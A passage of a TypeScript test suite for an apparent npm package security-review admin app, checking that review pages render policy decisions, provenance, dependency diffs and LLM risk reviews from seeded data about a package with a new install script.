    expect(comparePage.body).toContain("INSTALL_SCRIPT_CHANGED");
    expect(comparePage.body).toContain("node new.js");
    expect(comparePage.body).toContain("debug");
    expect(comparePage.body).toContain("optional");
    expect(comparePage.body).toContain("fsevents");
    expect(comparePage.body).toContain("Metadata Field Changes");
    expect(comparePage.body).toContain("github:demo/new");
    expect(comparePage.body).toContain("bin/native");
    expect(comparePage.body).toContain("size: 2048");
    expect(comparePage.body).toContain("mode: 0o755");
    expect(review.body).toContain("Compare latest reports");
    expect(review.body).toContain("analysis/pkg/1.0.0/policy/static-v2/sha512-new/report.json");
    expect(review.body).toContain("/api/reports/pkg/1.0.0/artifact?integrity=sha512-new&amp;shasum=newsum&amp;analyser=static-v2");
    expect(review.body).toContain("/reports/pkg/1.0.0?integrity=sha512-new&amp;shasum=newsum&amp;analyser=static-v2");
    await app.close();
  });

  it("renders a package version review page", async () => {
    const persistence = new MemoryPersistence();
    await seed(persistence);
    const app = buildAdmin({ persistence });

    const response = await app.inject({ method: "GET", url: "/packages/pkg/1.0.0" });

    expect(response.statusCode).toBe(200);
    expect(response.body).toContain("Review Summary");
    expect(response.body).toContain("Package Version");
    expect(response.body).toContain("Policy Decisions");
    expect(response.body).toContain("View decision history");
    expect(response.body).toContain("Weekly Downloads");
    expect(response.body).toContain("sha512-test");
    expect(response.body).toContain("static");
    expect(response.body).toContain("Latest Signals");
    expect(response.body).toContain("Provenance");
    expect(response.body).toContain("Target Attestation");
    expect(response.body).toContain("Manifest Changes");
    expect(response.body).toContain("Dependency Changes");
    expect(response.body).toContain("LLM Risk Reviews");
    expect(response.body).toContain("Install script needs review.");
    expect(response.body).toContain("Lifecycle script was introduced.");
    expect(response.body).toContain("Uses child process.");
    expect(response.body).toContain("override.created");
    await app.close();
  });
});

async function seed(persistence: MemoryPersistence) {
  await persistence.putPackageVersion({
    packageName: "pkg",
    version: "1.0.0",
    publishedAt: "2020-01-01T00:00:00.000Z",
    tarballUrl: "https://registry.example/pkg/-/pkg-1.0.0.tgz",
    integrity: "sha512-test",
    shasum: "abc123",
    weeklyDownloads: 42,
    cachedTarballKey: "tarballs/pkg/1.0.0/sha512-test.tgz"
  });
  await persistence.putPolicyDecision(
    "pkg",
    "1.0.0",
    "policy",
    {
      action: "block",
      score: 95,
      reasons: [{ code: "NEW_INSTALL_SCRIPT", message: "Lifecycle script was introduced.", severity: "high" }],
      explanation: "pkg@1.0.0 is blocked."
    },
    { tarballIntegrity: "sha512-test", tarballShasum: "abc123", analyserVersion: "static" }
  );
  await persistence.putAnalysisReport({
    packageName: "pkg",
    version: "1.0.0",
    analyserVersion: "static",
    policyVersion: "policy",
    tarballIntegrity: "sha512-test",
    tarballShasum: "abc123",
    provenance: {
      status: "present",
      target: {
        present: true,
        source: "dist.attestations",
        attestationUrl: "https://registry.example/-/npm/v1/attestations/pkg@1.0.0"
      },
      previous: { present: false },
      verification: {
        status: "subject_matched",
        verified: false,
        verifier: "metadata-provenance-2026-05-20.1",
        summary: "Provenance metadata subject matches the analysed package identity. Cryptographic signature verification has not been performed.",
        source: "dist.attestations",
        attestationUrl: "https://registry.example/-/npm/v1/attestations/pkg@1.0.0",
        subjectName: "pkg@1.0.0",
        expectedSubjectName: "pkg@1.0.0",
        subjectDigest: { sha512: "test" },
        expectedDigest: { sha512: "test" }
      }
    },
    score: 95,
    signals: [{ code: "NEW_INSTALL_SCRIPT", message: "Lifecycle script was introduced.", severity: "high" }],
    manifestDiff: {
      lifecycleScripts: {
        previous: {},
        target: { postinstall: "node install.js" }
      },
      metadata: {
        bin: { previous: undefined, target: { pkg: "cli.js" } },
        repository: { previous: "github:demo/old", target: "github:demo/new" },
        license: { previous: "MIT", target: "Apache-2.0" }
      }
    },
    dependencyDiff: {
      added: { "left-pad": "^1.3.0" },
      removed: { debug: "^4.3.0" },
      changed: { react: { previous: "^18.2.0", target: "^19.0.0" } },
      runtime: {
        added: { "left-pad": "^1.3.0" },
        removed: { debug: "^4.3.0" },
        changed: { react: { previous: "^18.2.0", target: "^19.0.0" } }
      },
      dev: { added: { vitest: "^3.2.4" }, removed: {}, changed: {} },
      optional: { added: { fsevents: "^2.3.3" }, removed: {}, changed: {} },
      peer: { added: {}, removed: {}, changed: { react: { previous: "^18.2.0", target: "^19.0.0" } } }
    },
    fileFindings: [{ path: "install.js", code: "USES_CHILD_PROCESS", reason: "Uses child process.", severity: "high", evidence: { installPath: true, pattern: "child_process" } }],
    createdAt: new Date().toISOString()
  });
  await persistence.putLlmRiskReview({
    packageName: "pkg",
    version: "1.0.0",
    provider: "stub",
    model: "none",
    review: {
      riskLevel: "high",
      confidence: "medium",
      summary: "Install script needs review.",
      suspectedRiskTypes: ["install_script_abuse"],
      evidence: [{ signal: "NEW_INSTALL_SCRIPT", explanation: "Lifecycle script appeared.", source: "package_json" }],
      recommendedAction: "quarantine"
    }
  });
  await persistence.putNodeBaseReport({
    source: "devcontainer",
    projectName: "demo",
    reportType: "dependency",
    summary: { highConfidenceFindings: 1, packagesWithLifecycleScripts: 2 },
    report: { summary: { highConfidenceFindings: 1, packagesWithLifecycleScripts: 2 } }
  });
  await persistence.putOverride({
    packageName: "pkg",
    version: "1.0.0",
    action: "allow",
    reason: "intentional",
    approvedBy: "test"
  });
  await persistence.putAuditEvent({
    actor: "test",
    eventType: "override.created",
    targetType: "package",
    targetId: "pkg@1.0.0",
    metadata: { reason: "intentional" }
  });
}
